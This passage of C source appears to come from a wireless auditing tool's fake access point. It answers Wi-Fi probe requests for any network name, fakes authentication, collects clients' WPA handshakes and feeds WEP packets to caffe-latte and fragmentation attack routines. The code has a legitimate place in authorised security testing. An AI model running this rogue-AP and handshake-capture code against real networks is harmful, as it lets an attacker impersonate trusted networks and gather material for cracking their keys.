        perror( "fwrite(IV bssid) failed" );
        fclose( f_ivs );
        return( 1 );
    }
    ivs2.len -= 6;

    /* write essid */
    if( fwrite( st_cur->essid, 1, st_cur->essid_length, f_ivs )
        != (size_t) st_cur->essid_length )
    {
        perror( "fwrite(IV essid) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    //add wpa data
    ivs2.flags = 0;
    ivs2.len = 0;

    ivs2.len= sizeof(struct WPA_hdsk);
    ivs2.flags |= IVS2_WPA;


    if( fwrite( &ivs2, 1, sizeof(struct ivs2_pkthdr), f_ivs )
        != (size_t) sizeof(struct ivs2_pkthdr) )
    {
        perror( "fwrite(IV header) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    if( fwrite( &(st_cur->wpa), 1, sizeof(struct WPA_hdsk), f_ivs ) != (size_t) sizeof(struct WPA_hdsk) )
    {
        perror( "fwrite(IV wpa_hdsk) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    fclose( f_ivs );

    return 0;
}

int packet_recv(unsigned char* packet, int length, struct AP_conf *apc, int external)
{
    unsigned char K[64];
    unsigned char bssid[6];
    unsigned char smac[6];
    unsigned char dmac[6];
    int trailer=0;
    unsigned char *tag=NULL;
    int len, i, c;
    unsigned char *buffer;
    char essid[256];
    struct timeval tv1;
    u_int64_t timestamp;
    char fessid[MAX_IE_ELEMENT_SIZE+1];
    int seqnum, fragnum, morefrag;
    int gotsource, gotbssid;
    int remaining, bytes2use;
    int reasso, fixed, temp_channel;
    unsigned z;

    struct ST_info *st_cur = NULL;
    struct ST_info *st_prv = NULL;

	reasso = 0; fixed = 0;
    memset(essid, 0, 256);

    pthread_mutex_lock( &mx_cap );
    if(opt.record_data)
        capture_packet(packet, length);
    pthread_mutex_unlock( &mx_cap );

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

	if (packet[0] == 0x88)
		z += 2; /* handle QoS field */

    if((unsigned)length < z)
    {
        return 1;
    }

    if(length > 3800)
    {
        return 1;
    }

    switch( packet[1] & 3 )
    {
        case  0:
            memcpy( bssid, packet + 16, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  1:
            memcpy( bssid, packet + 4, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  2:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 16, 6 );
            break;
        default:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 24, 6 );
            break;
    }

    if( (packet[1] & 3) == 0x03)
    {
        /* no wds support yet */
        return 1;
    }

    /* MAC Filter */
    if(opt.filter >= 0)
    {
        if(getMACcount(rClient) > 0)
        {
            /* filter clients */
            gotsource = gotMAC(rClient, smac);

            if((gotsource && opt.filter == BLOCK_MACS) || ( !gotsource && opt.filter == ALLOW_MACS))
                return 0;
        }
        if(getMACcount(rBSSID) > 0)
        {
            /* filter bssids */
            gotbssid = gotMAC(rBSSID, bssid);

            if((gotbssid && opt.filter == BLOCK_MACS) || ( !gotbssid && opt.filter == ALLOW_MACS))
                return 0;
        }
    }

    /* check list of clients */
    st_cur = opt.st_1st;
    st_prv = NULL;

    while( st_cur != NULL )
    {
        if( ! memcmp( st_cur->stmac, smac, 6 ) )
            break;

        st_prv = st_cur;
        st_cur = st_cur->next;
    }

    /* if it's a new client, add it */

    if( st_cur == NULL )
    {
        if( ! ( st_cur = (struct ST_info *) malloc(
                         sizeof( struct ST_info ) ) ) )
        {
            perror( "malloc failed" );
            return( 1 );
        }

        memset( st_cur, 0, sizeof( struct ST_info ) );

        if( opt.st_1st == NULL )
            opt.st_1st = st_cur;
        else
            st_prv->next  = st_cur;

        memcpy( st_cur->stmac, smac, 6 );

        st_cur->prev = st_prv;

        st_cur->tinit = time( NULL );
        st_cur->tlast = time( NULL );

        st_cur->power = -1;
        st_cur->rate_to = -1;
        st_cur->rate_from = -1;

        st_cur->probe_index = -1;
        st_cur->missed  = 0;
        st_cur->lastseq = 0;
        gettimeofday( &(st_cur->ftimer), NULL);

        for( i = 0; i < NB_PRB; i++ )
        {
            memset( st_cur->probes[i], 0, sizeof(
                    st_cur->probes[i] ) );
            st_cur->ssid_length[i] = 0;
        }

        memset(st_cur->essid, 0, 256);
        st_cur->essid_length = 0;

        st_cur->wpatype = 0;
        st_cur->wpahash = 0;
        st_cur->wep = 0;

        opt.st_end = st_cur;
    }


    /* Got a data packet with our bssid set and ToDS==1*/
    if( memcmp( bssid, opt.r_bssid, 6) == 0 && ( packet[0] & 0x08 ) == 0x08 && (packet[1] & 0x03) == 0x01 )
    {
//         printf("to me with len: %d\n", length);
        fragnum = packet[22] & 0x0F;
        seqnum = (packet[22] >> 4) | (packet[23] << 4);
        morefrag = packet[1] & 0x04;

//         printf("frag: %d, morefrag: %d\n", fragnum, morefrag);

        /* Fragment? */
        if(fragnum > 0 || morefrag)
        {
            addFrag(packet, smac, length);
            buffer = getCompleteFrag(smac, seqnum, &len);
            timeoutFrag();

            /* we got frag, no compelete packet avail -> do nothing */
            if(buffer == NULL)
                return 1;

//             printf("got all frags!!!\n");
            memcpy(packet, buffer, len);
            length = len;
            free(buffer);
            buffer = NULL;
        }

        /* intercept packets in case we got external processing */
        if(external)
        {
            intercept(packet, length);
            return 0;
        }

        /* To our mac? */
        if( (memcmp( dmac, opt.r_bssid, 6) == 0 && !opt.adhoc ) ||
            (memcmp( dmac, opt.r_smac, 6) == 0 && opt.adhoc ) )
        {
            /* Is encrypted */
            if( (packet[z] != packet[z + 1] || packet[z + 2] != 0x03) && (packet[1] & 0x40) == 0x40 )
            {
                /* check the extended IV flag */
                /* WEP and we got the key */
                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.cf_attack)
                {
                    memcpy( K, packet + z, 3 );
                    memcpy( K + 3, opt.wepkey, opt.weplen );

                    if (decrypt_wep( packet + z + 4, length - z - 4,
                                    K, 3 + opt.weplen ) == 0 )
                    {
//                         printf("ICV check failed!\n");
                        return 1;
                    }

                    /* WEP data packet was successfully decrypted, *
                    * remove the WEP IV & ICV and write the data  */

                    length -= 8;

                    memcpy( packet + z, packet + z + 4, length - z );

                    packet[1] &= 0xBF;
                }
                else
                {
                    if(opt.cf_attack)
                    {
                        addCF(packet, length);
                        return 0;
                    }

                    /* its a packet for us, but we either don't have the key or its WPA -> throw it away */
                    return 0;
                }
            }
            else
            {
                /* unencrypted data packet, nothing special, send it through dev_ti */
                if(opt.sendeapol && memcmp(packet+z, "\xAA\xAA\x03\x00\x00\x00\x88\x8E\x01\x01", 10) == 0)
                {
                    /* got eapol start frame */
                    if(opt.verbose)
                    {
                        PCT; printf("Got EAPOL start frame from %02X:%02X:%02X:%02X:%02X:%02X\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                    }
                    st_cur->wpa.state = 0;

                    if (opt.use_fixed_nonce) {
                    	memcpy(st_cur->wpa.anonce, opt.fixed_nonce, 32);
                    } else {
                    	for(i=0; i<32; i++)
                    		st_cur->wpa.anonce[i] = rand()&0xFF;
                    }
                    st_cur->wpa.state |= 1;

                    /* build first eapol frame */
                    memcpy(h80211, "\x08\x02\xd5\x00", 4);
                    len = 4;

                    memcpy(h80211+len, smac, 6);
                    len += 6;
                    memcpy(h80211+len, bssid, 6);
                    len += 6;
                    memcpy(h80211+len, bssid, 6);
                    len += 6;

                    h80211[len] = 0x60;
                    h80211[len+1] = 0x0f;
                    len += 2;

                    //llc+snap
                    memcpy(h80211+len, "\xAA\xAA\x03\x00\x00\x00\x88\x8E", 8);
                    len += 8;

                    //eapol
                    memset(h80211+len, 0, 99);
                    h80211[len]    = 0x01;//version
                    h80211[len+1]  = 0x03;//type
                    h80211[len+2]  = 0x00;
                    h80211[len+3]  = 0x5F;//len
                    if(opt.wpa1type)
                        h80211[len+4]  = 0xFE; //WPA1

                    if(opt.wpa2type)
                        h80211[len+4]  = 0x02; //WPA2

                    if(!opt.wpa1type && !opt.wpa2type)
                    {
                        if(st_cur->wpatype == 1) //WPA1
                            h80211[len+4]  = 0xFE; //WPA1
                        else if(st_cur->wpatype == 2)
                            h80211[len+4]  = 0x02; //WPA2
                    }

                    if(opt.sendeapol >= 1 && opt.sendeapol <= 2) //specified
                    {
                        if(opt.sendeapol == 1) //MD5
                        {
                            h80211[len+5] = 0x00;
                            h80211[len+6] = 0x89;
                        }
                        else //SHA1
                        {
                            h80211[len+5] = 0x00;
                            h80211[len+6] = 0x8a;
                        }
                    }
                    else //from asso
                    {
                        if(st_cur->wpahash == 1) //MD5
                        {
                            h80211[len+5] = 0x00;
                            h80211[len+6] = 0x89;
                        }
                        else if(st_cur->wpahash == 2) //SHA1
                        {
                            h80211[len+5] = 0x00;
                            h80211[len+6] = 0x8a;
                        }
                    }

                    h80211[len+7] = 0x00;
                    h80211[len+8] = 0x20; //keylen

                    memset(h80211+len+9, 0, 90);
                    memcpy(h80211+len+17, st_cur->wpa.anonce, 32);

                    len+=99;

                    send_packet(h80211, len);
                    return 0;
                }

                if(opt.sendeapol && memcmp(packet+z, "\xAA\xAA\x03\x00\x00\x00\x88\x8E\x01\x03", 10) == 0)
                {
                     st_cur->wpa.eapol_size = ( packet[z + 8 + 2] << 8 ) + packet[z + 8 + 3] + 4;

                     if ((unsigned)length - z - 10 < st_cur->wpa.eapol_size  || st_cur->wpa.eapol_size == 0 ||
                         st_cur->wpa.eapol_size > sizeof(st_cur->wpa.eapol))
                     {
                         // Ignore the packet trying to crash us.
                         st_cur->wpa.eapol_size = 0;
                         return 1;
                     }

                    /* got eapol frame num 2 */
                    memcpy( st_cur->wpa.snonce, &packet[z + 8 + 17], 32 );
                    st_cur->wpa.state |= 2;

                    memcpy( st_cur->wpa.keymic, &packet[z + 8 + 81], 16 );
                    memcpy( st_cur->wpa.eapol,  &packet[z + 8], st_cur->wpa.eapol_size );
                    memset( st_cur->wpa.eapol + 81, 0, 16 );
                    st_cur->wpa.state |= 4;
                    st_cur->wpa.keyver = packet[z + 8 + 6] & 7;

                    memcpy( st_cur->wpa.stmac, st_cur->stmac, 6 );

                    store_wpa_handshake(st_cur);
                    if(!opt.quiet)
                    {
                        PCT; printf("Got WPA handshake from %02X:%02X:%02X:%02X:%02X:%02X\n",
                                    smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                    }

                    return 0;
                }
            }
        }
        else
        {
            packet[1] &= 0xFC; //clear ToDS/FromDS
            if(!opt.adhoc)
            {
                /* Our bssid, ToDS=1, but to a different destination MAC -> send it through both interfaces */
                packet[1] |= 0x02; //set FromDS=1
                memcpy(packet +  4, dmac, 6);
                memcpy(packet + 10, bssid, 6);
                memcpy(packet + 16, smac, 6);
            }
            else
            {
                /* adhoc, don't replay */
                memcpy(packet +  4, dmac, 6);
                memcpy(packet + 10, smac, 6);
                memcpy(packet + 16, bssid, 6);
            }
//             printf("sent packet length: %d\n", length);
            /* Is encrypted */
            if( (packet[z] != packet[z + 1] || packet[z + 2] != 0x03) && (packet[1] & 0x40) == 0x40 )
            {
                /* check the extended IV flag */
                /* WEP and we got the key */
                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.caffelatte && !opt.cf_attack )
                {
                    memcpy( K, packet + z, 3 );
                    memcpy( K + 3, opt.wepkey, opt.weplen );

                    if (decrypt_wep( packet + z + 4, length - z - 4,
                                    K, 3 + opt.weplen ) == 0 )
                    {
//                         printf("ICV check failed!\n");
                        return 1;
                    }

                    /* WEP data packet was successfully decrypted, *
                    * remove the WEP IV & ICV and write the data  */

                    length -= 8;

                    memcpy( packet + z, packet + z + 4, length - z );

                    packet[1] &= 0xBF;

                    /* reencrypt it to send it with a new IV */
                    memcpy(h80211, packet, length);

                    if(create_wep_packet(h80211, &length, z) != 0) return 1;

                    if(!opt.adhoc)
                        send_packet(h80211, length);
                }
                else
                {
                    if(opt.caffelatte)
                    {
                        addarp(packet, length);
                    }
                    if(opt.cf_attack)
                    {
                        addCF(packet, length);
                    }
                    /* its a packet we can't decrypt -> just replay it through the wireless interface */
                    return 0;
                }
            }
            else
            {
                /* unencrypted -> send it through the wireless interface */
                send_packet(packet, length);
            }

        }

        memcpy( h80211,   dmac, 6);  //DST_MAC
        memcpy( h80211+6, smac, 6);  //SRC_MAC

        memcpy( h80211+12, packet+z+6, 2);  //copy ether type

        if( (unsigned)length <= z+8 )
            return 1;

        memcpy( h80211+14, packet+z+8, length-z-8);
        length = length -z-8+14;

        //ethernet frame must be atleast 60 bytes without fcs
        if(length < 60)
        {
            trailer = 60 - length;
            memset(h80211 + length, 0, trailer);
            length += trailer;
        }

        ti_write(dev.dv_ti, h80211, length);
    }
    else
    {
        //react on management frames
        //probe request -> send probe response if essid matches. if brodcast probe, ignore it.
        if( packet[0] == 0x40 )
        {
            tag = parse_tags(packet+z, 0, length-z, &len);
            if(tag != NULL && tag[0] >= 32 && len <= 255) //directed probe
            {
                if( opt.promiscuous || !opt.f_essid || gotESSID((char*)tag, len) == 1)
                {
                    memset(essid, 0, 256);
                    memcpy(essid, tag, len);

                    /* store probes */
                    if (len > 0 && essid[0] == 0)
                            goto skip_probe;

                    /* got a valid probed ESSID */

                    /* add this to the beacon queue */
                    if(opt.beacon_cache)
                        addESSID(essid, len, opt.beacon_cache);

                    /* check if it's already in the ring buffer */
                    for( i = 0; i < NB_PRB; i++ )
                        if( memcmp( st_cur->probes[i], essid, len ) == 0 )
                            goto skip_probe;

                    st_cur->probe_index = ( st_cur->probe_index + 1 ) % NB_PRB;
                    memset( st_cur->probes[st_cur->probe_index], 0, 256 );
                    memcpy( st_cur->probes[st_cur->probe_index], essid, len ); //twice?!
                    st_cur->ssid_length[st_cur->probe_index] = len;

                    for( i = 0; i < len; i++ )
                    {
                        c = essid[i];
                        if( c == 0 || ( c > 126 && c < 160 ) ) c = '.';  //could also check ||(c>0 && c<32)
                        st_cur->probes[st_cur->probe_index][i] = c;
                    }

skip_probe:

                    //transform into probe response
                    packet[0] = 0x50;

                    if(opt.verbose)
                    {
                        PCT; printf("Got directed probe request from %02X:%02X:%02X:%02X:%02X:%02X - \"%s\"\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5], essid);
                    }

                    //store the tagged parameters and insert the fixed ones
                    buffer = (unsigned char*) malloc(length-z);
                    memcpy(buffer, packet+z, length-z);

                    memcpy(packet+z, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12);  //fixed information
                    packet[z+8] = (apc->interval) & 0xFF;       //beacon interval
                    packet[z+9] = (apc->interval >> 8) & 0xFF;
                    memcpy(packet+z+10, apc->capa, 2);          //capability

                    //set timestamp
                    gettimeofday( &tv1,  NULL );
                    timestamp=tv1.tv_sec*1000000UL + tv1.tv_usec;

                    //copy timestamp into response; a mod 2^64 counter incremented each microsecond
                    for(i=0; i<8; i++)
                    {
                        packet[z+i] = ( timestamp >> (i*8) ) & 0xFF;
                    }

                    //insert tagged parameters
                    memcpy(packet+z+12, buffer, length-z);
                    length += 12;
                    free(buffer);
                    buffer = NULL;

                    //add channel
                    packet[length]   = 0x03;
                    packet[length+1] = 0x01;
                    temp_channel = wi_get_channel(_wi_in); //current channel
                    if (!invalid_channel_displayed) {
                	    if (temp_channel > 255) {
                	    	// Display error message once
                	    	invalid_channel_displayed = 1;
                	    	fprintf(stderr, "Error: Got channel %d, expected a value < 256.\n", temp_channel);
                	    } else if (temp_channel < 1) {
							invalid_channel_displayed = 1;
                	    	fprintf(stderr, "Error: Got channel %d, expected a value > 0.\n", temp_channel);
						}
					}
                    packet[length+2] = ((temp_channel > 255 || temp_channel < 1) && opt.channel != 0) ? opt.channel : temp_channel;

                    length += 3;

                    memcpy(packet +  4, smac, 6);
                    memcpy(packet + 10, opt.r_bssid, 6);
                    memcpy(packet + 16, opt.r_bssid, 6);

                    // TODO: See also about 100 lines below
                    if( opt.allwpa )
                    {
                        memcpy(packet+length, ALL_WPA2_TAGS, sizeof(ALL_WPA2_TAGS) -1);
                        length += sizeof(ALL_WPA2_TAGS) -1;
                        memcpy(packet+length, ALL_WPA1_TAGS, sizeof(ALL_WPA1_TAGS) -1);
                        length += sizeof(ALL_WPA1_TAGS) -1;
                    }
                    else
                    {
                    	if(opt.wpa2type > 0)
						{
							memcpy(packet+length, WPA2_TAG, 22);
							packet[length+7] = opt.wpa2type;
							packet[length+13] = opt.wpa2type;
							length += 22;
						}

                    	if(opt.wpa1type > 0)
						{
							memcpy(packet+length, WPA1_TAG, 24);
							packet[length+11] = opt.wpa1type;
							packet[length+17] = opt.wpa1type;
							length += 24;
						}
					}

                    send_packet(packet, length);

                    //send_packet(packet, length);

                    //send_packet(packet, length);
                    return 0;
                }
            }
            else //broadcast probe
            {
                if(!opt.nobroadprobe)
                {
                    //transform into probe response
                    packet[0] = 0x50;

                    if(opt.verbose)
                    {
                        PCT; printf("Got broadcast probe request from %02X:%02X:%02X:%02X:%02X:%02X\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                    }

                    //store the tagged parameters and insert the fixed ones
                    buffer = (unsigned char*) malloc(length-z);
                    memcpy(buffer, packet+z, length-z);

                    memcpy(packet+z, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12);  //fixed information
                    packet[z+8] = (apc->interval) & 0xFF;       //beacon interval
                    packet[z+9] = (apc->interval >> 8) & 0xFF;
                    memcpy(packet+z+10, apc->capa, 2);          //capability

                    //set timestamp
                    gettimeofday( &tv1,  NULL );
                    timestamp=tv1.tv_sec*1000000UL + tv1.tv_usec;

                    //copy timestamp into response; a mod 2^64 counter incremented each microsecond
                    for(i=0; i<8; i++)
                    {
                        packet[z+i] = ( timestamp >> (i*8) ) & 0xFF;
                    }

                    //insert essid
                    len = getESSID(fessid);
                    if(!len)
                    {
                        strcpy(fessid, "default");
                        len = strlen(fessid);
                    }
                    packet[z+12] = 0x00;
                    packet[z+13] = len;
                    memcpy(packet+z+14, fessid, len);

                    //insert tagged parameters
                    memcpy(packet+z+14+len, buffer, length-z); //now we got 2 essid tags... ignore that

                    length += 12; //fixed info
                    free(buffer);
                    buffer = NULL;
                    length += 2+len; //default essid

                    //add channel
                    packet[length]   = 0x03;
                    packet[length+1] = 0x01;
                    temp_channel = wi_get_channel(_wi_in); //current channel
                    if (!invalid_channel_displayed) {
                	    if (temp_channel > 255) {
                	    	// Display error message once
                	    	invalid_channel_displayed = 1;
                	    	fprintf(stderr, "Error: Got channel %d, expected a value < 256.\n", temp_channel);
                	    } else if (temp_channel < 1) {
							invalid_channel_displayed = 1;
                	    	fprintf(stderr, "Error: Got channel %d, expected a value > 0.\n", temp_channel);
						}
					}
                    packet[length+2] = ((temp_channel > 255 || temp_channel < 1) && opt.channel != 0) ? opt.channel : temp_channel;

                    length += 3;

                    memcpy(packet +  4, smac, 6);
                    memcpy(packet + 10, opt.r_bssid, 6);
                    memcpy(packet + 16, opt.r_bssid, 6);

                    // TODO: See also around ~3500
                    if( opt.allwpa )
                    {
                        memcpy(packet+length, ALL_WPA2_TAGS, sizeof(ALL_WPA2_TAGS) -1);
                        length += sizeof(ALL_WPA2_TAGS) -1;
                        memcpy(packet+length, ALL_WPA1_TAGS, sizeof(ALL_WPA1_TAGS) -1);
                        length += sizeof(ALL_WPA1_TAGS) -1;
                    }
                    else
                    {
                    	if(opt.wpa2type > 0)
						{
							memcpy(packet+length, WPA2_TAG, 22);
							packet[length+7] = opt.wpa2type;
							packet[length+13] = opt.wpa2type;
							length += 22;
						}

						if(opt.wpa1type > 0)
						{
							memcpy(packet+length, WPA1_TAG, 24);
							packet[length+11] = opt.wpa1type;
							packet[length+17] = opt.wpa1type;
							length += 24;
						}
                    }

                    send_packet(packet, length);

                    send_packet(packet, length);

                    send_packet(packet, length);
                    return 0;
                }
            }
        }

        //auth req
        if(packet[0] == 0xB0 && memcmp( bssid, opt.r_bssid, 6) == 0 )
        {
            if(packet[z] == 0x00) //open system auth
            {
                //make sure its an auth request
                if(packet[z+2] == 0x01)
                {
                    if(opt.verbose)
                    {
                        PCT; printf("Got an auth request from %02X:%02X:%02X:%02X:%02X:%02X (open system)\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                    }
                    memcpy(packet +  4, smac, 6);
                    memcpy(packet + 10, dmac, 6);
                    packet[z+2] = 0x02;

                    if(opt.forceska)
                    {
                        packet[z] = 0x01;
                        packet[z+4] = 13;
                    }

                    send_packet(packet, length);
                    return 0;
                }
            }
            else //shared key auth
            {
                //first response
                if(packet[z+2] == 0x01 && (packet[1] & 0x40) == 0x00 )
                {
                    if(opt.verbose)
                    {
                        PCT; printf("Got an auth request from %02X:%02X:%02X:%02X:%02X:%02X (shared key)\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                    }
                    memcpy(packet +  4, smac, 6);
                    memcpy(packet + 10, dmac, 6);
                    packet[z+2] = 0x02;

                   remaining = opt.skalen;

                    while(remaining > 0)
                    {
                        bytes2use = MIN(255,remaining);
                        remaining -= bytes2use;
                        //add challenge
                        packet[length] = 0x10;
                        packet[length+1] = bytes2use;
                        length += 2;

                        for(i=0; i<bytes2use; i++)
                        {
                            packet[length+i] = rand() & 0xFF;
                        }

                        length += bytes2use;
                    }
                    send_packet(packet, length);
                    check_shared_key(packet, length);
                    return 0;
                }

                //second response
                if( (packet[1] & 0x40) == 0x40 )
                {
                    check_shared_key(packet, length);
                    packet[1] = 0x00; //not encrypted
                    memcpy(packet +  4, smac, 6);
                    memcpy(packet + 10, dmac, 6);

                    packet[z]   = 0x01;//shared key
                    packet[z+1] = 0x00;
                    packet[z+2] = 0x04;//sequence 4
                    packet[z+3] = 0x00;
                    packet[z+4] = 0x00;//successful
                    packet[z+5] = 0x00;

                    length = z+6;
                    send_packet(packet, length);
                    check_shared_key(packet, length);
                    if(!opt.quiet)
                        PCT; printf("SKA from %02X:%02X:%02X:%02X:%02X:%02X\n",
                                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5]);
                }
            }
        }

        //asso req or reasso
        if((packet[0] == 0x00 || packet[0] == 0x20) && memcmp( bssid, opt.r_bssid, 6) == 0 )
        {
            if(packet[0] == 0x00) //asso req
            {
                reasso = 0;
                fixed = 4;
            }
            else
            {
                reasso = 1;
                fixed = 10;
            }

            st_cur->wep = (packet[z] & 0x10) >> 4;

            tag = parse_tags(packet+z+fixed, 0, length-z-fixed, &len);
            if(tag != NULL && tag[0] >= 32 && len < 256)
            {
                memcpy(essid, tag, len);
                essid[len] = 0x00;
                if(opt.f_essid && !gotESSID(essid, len))
                    return 0;
            }

            st_cur->wpatype=0;
            st_cur->wpahash=0;

            tag = parse_tags(packet+z+fixed, 0xDD, length-z-fixed, &len);
            while( tag != NULL )
            {
//                 printf("Found WPA TAG\n");
                wpa_client(st_cur, tag-2, len+2);
                tag += (tag-2)[1]+2;
                tag = parse_tags(tag-2, 0xDD, length-(tag-packet)+2, &len);
            }

            tag = parse_tags(packet+z+fixed, 0x30, length-z-fixed, &len);
            while( tag != NULL )
            {
//                 printf("Found WPA2 TAG\n");
                wpa_client(st_cur, tag-2, len+2);
                tag += (tag-2)[1]+2;
                tag = parse_tags(tag-2, 0x30, length-(tag-packet)+2, &len);
            }

            if(!reasso)
                packet[0] = 0x10;
            else
                packet[0] = 0x30;

            memcpy(packet +  4, smac, 6);
            memcpy(packet + 10, dmac, 6);

            //store the tagged parameters and insert the fixed ones
            buffer = (unsigned char*) malloc(length-z-fixed);
            memcpy(buffer, packet+z+fixed, length-z-fixed);

            packet[z+2] = 0x00;
            packet[z+3] = 0x00;
            packet[z+4] = 0x01;
            packet[z+5] = 0xC0;

            memcpy(packet+z+6, buffer, length-z-fixed);
            length +=(6-fixed);
            free(buffer);
            buffer = NULL;

            len = length - z - 6;
            remove_tag(packet+z+6, 0, &len);
            length = len + z + 6;

            send_packet(packet, length);
            if(!opt.quiet)
            {
                PCT; printf("Client %02X:%02X:%02X:%02X:%02X:%02X %sassociated",
                        smac[0],smac[1],smac[2],smac[3],smac[4],smac[5], (reasso==0)?"":"re");
                if(st_cur->wpatype != 0)
                {
                    if(st_cur->wpatype == 1)
                        printf(" (WPA1");
                    else
                        printf(" (WPA2");

                    if(st_cur->wpahash == 1)
                        printf(";TKIP)");
                    else
                        printf(";CCMP)");
                }
                else if(st_cur->wep != 0)
                {
                    printf(" (WEP)");
                }
                else
                {
                    printf(" (unencrypted)");
                }

                if(essid[0] != 0x00)
                    printf(" to ESSID: \"%s\"", essid);
                printf("\n");
            }

            memset(st_cur->essid, 0, 256);
            memcpy(st_cur->essid, essid, 255);
            st_cur->essid_length = strlen(essid);

            memset(essid, 0, 256);

            /* either specified or determined */
            if( (opt.sendeapol && ( opt.wpa1type || opt.wpa2type ) ) || (st_cur->wpatype && st_cur->wpahash) )
            {
                st_cur->wpa.state = 0;

                if (opt.use_fixed_nonce) {
					memcpy(st_cur->wpa.anonce, opt.fixed_nonce, 32);
				} else {
					for(i=0; i<32; i++)
						st_cur->wpa.anonce[i] = rand()&0xFF;
				}

                st_cur->wpa.state |= 1;

                /* build first eapol frame */
                memcpy(h80211, "\x08\x02\xd5\x00", 4);
                len = 4;

                memcpy(h80211+len, smac, 6);
                len += 6;
                memcpy(h80211+len, bssid, 6);
                len += 6;
                memcpy(h80211+len, bssid, 6);
                len += 6;

                h80211[len] = 0x60;
                h80211[len+1] = 0x0f;
                len += 2;

                //llc+snap
                memcpy(h80211+len, "\xAA\xAA\x03\x00\x00\x00\x88\x8E", 8);
                len += 8;

                //eapol
                memset(h80211+len, 0, 99);
                h80211[len]    = 0x01;//version
                h80211[len+1]  = 0x03;//type
                h80211[len+2]  = 0x00;
                h80211[len+3]  = 0x5F;//len
                if(opt.wpa1type)
                    h80211[len+4]  = 0xFE; //WPA1

                if(opt.wpa2type)
                    h80211[len+4]  = 0x02; //WPA2

                if(!opt.wpa1type && !opt.wpa2type)
                {
                    if(st_cur->wpatype == 1) //WPA1
                        h80211[len+4]  = 0xFE; //WPA1
                    else
                        h80211[len+4]  = 0x02; //WPA2
                }

                if(opt.sendeapol >= 1 && opt.sendeapol <= 2) //specified
                {
                    if(opt.sendeapol == 1) //MD5
                    {
                        h80211[len+5] = 0x00;
                        h80211[len+6] = 0x89;
                    }
                    else //SHA1
                    {
                        h80211[len+5] = 0x00;
                        h80211[len+6] = 0x8a;
                    }
                }
                else //from asso
                {
                    if(st_cur->wpahash == 1) //MD5
                    {
                        h80211[len+5] = 0x00;
                        h80211[len+6] = 0x89;
                    }
                    else if(st_cur->wpahash == 2) //SHA1
                    {
                        h80211[len+5] = 0x00;
                        h80211[len+6] = 0x8a;
                    }
                }

                h80211[len+7] = 0x00;
                h80211[len+8] = 0x20; //keylen

                memset(h80211+len+9, 0, 90);
                memcpy(h80211+len+17, st_cur->wpa.anonce, 32);

                len+=99;

                send_packet(h80211, len);
            }

            return 0;
        }

        return 0;
    }

    return 0;
}

void beacon_thread( void *arg )
{
    struct AP_conf apc;
    struct timeval tv, tv1, tv2;
    u_int64_t timestamp;
    unsigned char beacon[512];
    int beacon_len=0;
    int seq=0, i=0, n=0;
    int essid_len, temp_channel;
    char essid[MAX_IE_ELEMENT_SIZE+1];
    float f, ticks[3];

    memset(essid, 0, MAX_IE_ELEMENT_SIZE+1);
    memcpy(&apc, arg, sizeof(struct AP_conf));

    ticks[0]=0;
    ticks[1]=0;
    ticks[2]=0;

    while( 1 )
    {
        /* sleep until the next clock tick */
        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return;
            }

            ticks[0]++;
            ticks[1]++;
            ticks[2]++;
        }
        else
        {
            gettimeofday( &tv,  NULL );
            usleep( 1000000/RTC_RESOLUTION );
            gettimeofday( &tv2, NULL );

#if defined(__x86_64__) && defined(__CYGWIN__)
        	f = (0.0f + 1000000)
#else
		f = 1000000.0
#endif
			 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / ( 1000000/RTC_RESOLUTION );
            ticks[1] += f / ( 1000000/RTC_RESOLUTION );
            ticks[2] += f / ( 1000000/RTC_RESOLUTION );
        }

        if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)apc.interval/
#if defined(__x86_64__) && defined(__CYGWIN__)
		(0.0f + 1000))*(double)seq )
#else
		1000.0)*(double)seq )
#endif
        {
            /* threshold reach, send one frame */
//             ticks[2] = 0;
            fflush(stdout);
            gettimeofday( &tv1,  NULL );
            timestamp=tv1.tv_sec*1000000UL + tv1.tv_usec;
            fflush(stdout);

            /* flush expired ESSID entries */
            flushESSID();
            essid_len = getNextESSID(essid);
            if (!essid_len) {
                strcpy(essid, "default");
                essid_len = strlen("default");
            }

            beacon_len = 0;

            memcpy(beacon, "\x80\x00\x00\x00", 4);  //type/subtype/framecontrol/duration
            beacon_len+=4;
            memcpy(beacon+beacon_len , BROADCAST, 6);        //destination
            beacon_len+=6;
            if(!opt.adhoc)
                memcpy(beacon+beacon_len, apc.bssid, 6);        //source
            else
                memcpy(beacon+beacon_len, opt.r_smac, 6);        //source
            beacon_len+=6;
            memcpy(beacon+beacon_len, apc.bssid, 6);        //bssid
            beacon_len+=6;
            memcpy(beacon+beacon_len, "\x00\x00", 2);       //seq+frag
            beacon_len+=2;

            memcpy(beacon+beacon_len, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12);  //fixed information

            beacon[beacon_len+8] = (apc.interval * MAX(getESSIDcount(), 1) ) & 0xFF;       //beacon interval
